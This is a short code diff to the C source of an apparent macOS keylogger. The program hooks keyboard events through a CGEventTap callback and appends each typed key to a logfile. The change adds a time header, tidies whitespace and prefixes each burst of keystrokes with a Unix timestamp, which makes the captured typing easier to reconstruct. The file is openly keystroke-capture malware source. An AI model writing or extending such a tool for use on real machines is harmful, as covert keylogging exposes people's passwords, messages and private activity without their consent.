@@ -1,3 +1,4 @@
+#include <time.h>
 #include "keylogger.h"
 
 time_t last_time = 0;
@@ -37,7 +38,7 @@ int main(int argc, const char *argv[]) {
     // Get the current time and open the logfile.
     time_t result = time(NULL);
     logfile = fopen(logfileLocation, "a");
-    
+
     if (!logfile) {
         fprintf(stderr, "ERROR: Unable to open log file. Ensure that you have the proper permissions.\n");
         exit(1);
@@ -64,8 +65,8 @@ CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef e
 
     time_t curr_time = time(0);
     if (curr_time - last_time > 1) {
-         fprintf(logfile, "\n");
-    }       
+         fprintf(logfile, "\n%ld|", time(NULL));
+    }
     // Print the human readable key to the logfile.
     fprintf(logfile, "%s", convertKeyCode(keyCode));
     last_time = curr_time;
